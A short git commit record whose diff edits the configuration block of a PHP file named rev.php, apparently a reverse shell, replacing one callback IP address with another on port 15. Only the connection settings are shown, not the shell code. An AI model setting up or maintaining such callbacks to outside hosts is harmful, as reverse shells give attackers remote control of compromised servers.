efe6ebe81e89b0dee89f3ad248d62c24bf999b97
Bob-Marley-Backup <emailbuatus2@gmail.com>
2026-08-04 23:12:31 +0700

    Update rev.php

--- rev.php
+++ rev.php
@@ -6,7 +6,7 @@
 
 // ============= CONFIGURATION (EDIT HERE) =============
 $CONFIG = array(
-    'host' => '31.57.184.148',  // Your IP here
+    'host' => '152.89.168.215',  // Your IP here
     'port' => 15,                 // Your port here
     'timeout' => 30,
     'buffer' => 1400,
